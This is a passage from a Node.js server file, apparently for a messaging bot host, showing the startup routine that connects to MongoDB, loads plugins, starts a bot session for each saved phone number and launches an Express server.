        hasQr: qrCodes.has(number)
    });
});

// ─────────────────────────────────────
//  STARTUP
// ─────────────────────────────────────
async function main() {
    await connectMongo();
    await loadPluginFiles();

    const savedNumbers = await getActiveNumbers();

    for (const number of savedNumbers) {
        try {
            await startBot(number);
        } catch (err) {
            console.error(`❌ Error starting session for ${number}:`, err.message);
        }
    }

    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on: http://localhost:${PORT}`);
    }).on('error', (err) => {
        console.error('❌ Failed to start server:', err.message);
    });
}

main().catch(err => console.error('❌ Startup error:', err.message));